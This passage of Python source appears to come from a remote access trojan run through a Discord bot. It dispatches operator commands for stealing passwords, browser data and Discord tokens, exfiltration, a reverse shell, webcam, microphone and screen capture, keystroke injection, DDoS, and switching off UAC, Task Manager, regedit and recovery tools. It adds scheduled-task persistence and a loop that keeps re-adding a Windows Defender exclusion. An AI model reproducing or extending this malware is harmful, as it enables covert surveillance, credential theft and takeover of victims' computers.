    c_force_disablereagentc = get_global_cmd("CMD_FORCEDISABLEREAGENTC")
    c_force_enablereagentc = get_global_cmd("CMD_FORCEENABLEREAGENTC")
    c_shutdown = get_global_cmd("CMD_SHUTDOWN")
    c_restart = get_global_cmd("CMD_RESTART")
    c_runonce = get_global_cmd("CMD_RUNONCE")
    c_unmutemic = get_global_cmd("CMD_UNMUTEMIC")
    c_unrunonce = get_global_cmd("CMD_UNRUNONCE")
    c_webcam = get_global_cmd("CMD_WEBCAM")
    c_mic = get_global_cmd("CMD_MIC")
    c_wallpaper = get_global_cmd("CMD_WALLPAPER")
    c_wallpaperurl = get_global_cmd("CMD_WALLPAPERURL")
    c_steal = get_global_cmd("CMD_STEAL")
    c_stealbrowser = get_global_cmd("CMD_STEALBROWSER")
    c_stealdiscord = get_global_cmd("CMD_STEALDISCORD")
    c_processes = get_global_cmd("CMD_PROCESSES")
    c_kill = get_global_cmd("CMD_KILL")
    c_startup = get_global_cmd("CMD_STARTUP")
    c_unstartup = get_global_cmd("CMD_UNSTARTUP")
    c_search = get_global_cmd("CMD_SEARCH")
    c_ddos = get_global_cmd("CMD_DDOS")
    c_volup = get_global_cmd("CMD_VOLUP")
    c_voldown = get_global_cmd("CMD_VOLDOWN")
    c_volmute = get_global_cmd("CMD_VOLMUTE")
    c_volset = get_global_cmd("CMD_VOLSET")
    c_commands = get_global_cmd("CMD_COMMANDS")
    c_mousepad = get_global_cmd("CMD_MOUSEPAD")
    c_type = get_global_cmd("CMD_TYPE")
    c_key = get_global_cmd("CMD_KEY")
    c_combo = get_global_cmd("CMD_COMBO")
    c_record = get_global_cmd("CMD_RECORD")
    c_shell = get_global_cmd("CMD_SHELL")
    c_chat = get_global_cmd("CMD_CHAT")
    c_recent = get_global_cmd("CMD_RECENT")
    c_netscan = get_global_cmd("CMD_NETSCAN")
    c_task = get_global_cmd("CMD_TASK")
    c_untask = get_global_cmd("CMD_UNTASK")
    c_exfil = get_global_cmd("CMD_EXFIL")
    c_stealpasswords = get_global_cmd("CMD_STEALPASSWORDS")

    # --- COMMAND HANDLERS ---
    
    if c_list:
        if command == c_list:
            await handle_list(ctx, ' '.join(args) if args else '.')
    
    elif c_read and command == c_read:
        await handle_read(ctx, ' '.join(args))
    elif c_download and command == c_download:
        await handle_download(ctx, ' '.join(args))
    elif c_upload and command == c_upload:
        path = args[0] if args else '.'
        filename = args[1] if len(args) > 1 else None
        await handle_upload(ctx, message, path, filename=filename)
    elif c_delete and command == c_delete:
        await handle_delete(ctx, ' '.join(args))
    elif c_run and command == c_run:
        await handle_run(ctx, ' '.join(args))
    elif c_screenshot and command == c_screenshot:
        await handle_screenshot(ctx)
    elif c_open and command == c_open:
        await handle_open(ctx, ' '.join(args))
    elif c_disabletm and command == c_disabletm:
        await handle_disabletm(ctx)
    elif c_enabletm and command == c_enabletm:
        await handle_enabletm(ctx)
    elif c_disableregedit and command == c_disableregedit:
        await handle_disableregedit(ctx)
    elif c_enableregedit and command == c_enableregedit:
        await handle_enableregedit(ctx)
    elif c_disablecmd and command == c_disablecmd:
        await handle_disablecmd(ctx)
    elif c_enablecmd and command == c_enablecmd:
        await handle_enablecmd(ctx)
    elif c_disableuac and command == c_disableuac:
        await handle_disableuac(ctx)
    elif c_enableuac and command == c_enableuac:
        await handle_enableuac(ctx)
    elif c_disablereagentc and command == c_disablereagentc:
        result = disable_winre()
        await ctx.send("‚úÖ **WinRE disabled.**" if result == "Success" else f"‚ùå **Failed:** `{result}`")
    elif c_enablereagentc and command == c_enablereagentc:
        result = enable_winre()
        await ctx.send("‚úÖ **WinRE enabled.**" if result == "Success" else f"‚ùå **Failed:** `{result}`")
    elif c_force_disablereagentc and command == c_force_disablereagentc:
        await force_disable_winre(ctx)
    elif c_force_enablereagentc and command == c_force_enablereagentc:
        await force_enable_winre(ctx)
    elif c_shutdown and command == c_shutdown:
        await handle_shutdown(ctx)
    elif c_restart and command == c_restart:
        await handle_restart(ctx)
    elif c_runonce and command == c_runonce:
        await handle_runonce(ctx)
    elif c_unmutemic and command == c_unmutemic:
        await handle_unmute_mic(ctx)
    elif c_unrunonce and command == c_unrunonce:
        await handle_unrunonce(ctx)
    elif c_webcam and command == c_webcam:
        await handle_webcam(ctx)
    elif c_mic and command == c_mic:
        await handle_mic(ctx, int(args[0]) if args and args[0].isdigit() else 5)
    elif c_wallpaper and command == c_wallpaper:
        await handle_wallpaper(ctx, ' '.join(args))
    elif c_wallpaperurl and command == c_wallpaperurl:
        await handle_wallpaperurl(ctx, ' '.join(args))
    elif c_steal and command == c_steal:
        await handle_steal(ctx)
    elif c_stealbrowser and command == c_stealbrowser:
        await handle_stealbrowser(ctx)
    elif c_stealdiscord and command == c_stealdiscord:
        await handle_stealdiscord(ctx)
    elif c_processes and command == c_processes:
        await handle_processes(ctx)
    elif c_kill and command == c_kill:
        await handle_kill(ctx, ' '.join(args))
    elif c_startup and command == c_startup:
        await handle_startup(ctx)
    elif c_unstartup and command == c_unstartup:
        await handle_unstartup(ctx)
    elif c_search and command == c_search:
        if len(args) < 2:
            await ctx.send("Usage: `!search <path> <search_term>`"); return
        await handle_search(ctx, args[0], ' '.join(args[1:]))
    elif c_ddos and command == c_ddos:
        await handle_ddos(ctx, *args)
    elif c_volup and command == c_volup:
        await handle_volup(ctx, int(args[0]) if args and args[0].isdigit() else 1)
    elif c_voldown and command == c_voldown:
        await handle_voldown(ctx, int(args[0]) if args and args[0].isdigit() else 1)
    elif c_volmute and command == c_volmute:
        await handle_volmute(ctx)
    elif c_volset and command == c_volset:
        await handle_volset(ctx, int(args[0]) if args and args[0].isdigit() else 10)
    elif c_commands and command == c_commands:
        await handle_commands(ctx)
    elif c_mousepad and command == c_mousepad:
        await handle_mousepad(ctx)
    elif c_type and command == c_type:
        if not args:
            await ctx.send("Usage: `!type \"your text here\"`"); return
        await handle_key_type(ctx, ' '.join(args))
    elif c_key and command == c_key:
        if not args:
            await ctx.send("Usage: `!key <key_name>`"); return
        await handle_key_press(ctx, args[0])
    elif c_combo and command == c_combo:
        if not args:
            await ctx.send("Usage: `!combo <combo>`"); return
        await handle_key_combo(ctx, '+'.join(args))
    elif c_record and command == c_record:
        duration = int(args[0]) if args and args[0].isdigit() and 5 <= int(args[0]) <= 30 else 15
        if not 5 <= duration <= 30:
            await ctx.send("Please specify a duration between 5 and 30 seconds."); return
        await capture_desktop_video(ctx, duration_seconds=duration)
    elif c_shell and command == c_shell:
        if not args:
            await ctx.send("Usage: `!shell start` or `!shell stop`"); return
        if args[0].lower() == 'start':
            await handle_reverse_shell(ctx, 'start')
            ctx._shell_just_started = True
        elif args[0].lower() == 'stop':
            await handle_reverse_shell(ctx, 'stop')
    elif c_chat and command == c_chat:
        if not args:
            await ctx.send("Usage: `!chat start` or `!chat stop`"); return
        await handle_chat(ctx, args[0].lower(), message.author)
    elif c_recent and command == c_recent:
        await handle_recent(ctx)
    elif c_netscan and command == c_netscan:
        await handle_netscan(ctx)
    elif c_task and command == c_task:
        result = add_scheduled_task_persistence()
        await ctx.send(f"‚úÖ Scheduled Task persistence enabled.\n**Details:** `{result}`" if "Success" in result else f"‚ùå Failed: `{result}`")
    elif c_untask and command == c_untask:
        result = remove_scheduled_task_persistence()
        await ctx.send(f"‚úÖ Scheduled Task persistence disabled.\n**Details:** `{result}`" if "Success" in result else f"‚ùå Failed: `{result}`")
    elif c_exfil and command == c_exfil:
        await handle_exfil(ctx)
    elif c_stealpasswords and command == c_stealpasswords:
        await handle_stealpasswords(ctx)
    else:
        await ctx.send(f"Unknown command: `!{command}`")

# --- FINAL EXECUTION BLOCK ---
from discord.ext import tasks
@tasks.loop(minutes=10)
async def exclusion_monitor():
    """Periodically checks and re-adds the Windows Defender exclusion."""
    print("[DEFENDER MONITOR] Running periodic check...")
    is_excluded = check_exclusion_status()
    if not is_excluded:
        print("[DEFENDER MONITOR] Exclusion not found. Attempting to re-add...")
        add_to_defender_exclusions()

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    check_kill_switch()
    download_dependency()
    
    try:
        # Run the security lockdown (this is an async function, so we wrap it)
        asyncio.run(secure_environment())
    except Exception as e:
        print(f"[CRITICAL ERROR] Failed to secure environment on startup: {e}")

    try:
        print("[INFO] Starting Discord bot...")
        # Get token from config
        BOT_TOKEN = CONFIG.get("BOT_TOKEN")
        
        if not BOT_TOKEN:
            print("[CRITICAL ERROR] BOT_TOKEN is missing from config.json!")
            sys.exit(1)
            
        client.run(BOT_TOKEN)
        
    except discord.errors.LoginFailure:
        print("[CRITICAL ERROR] Invalid Discord token. Please check your config.")
    except Exception as e:
        print(f"[CRITICAL ERROR] Could not start Discord bot: {e}")
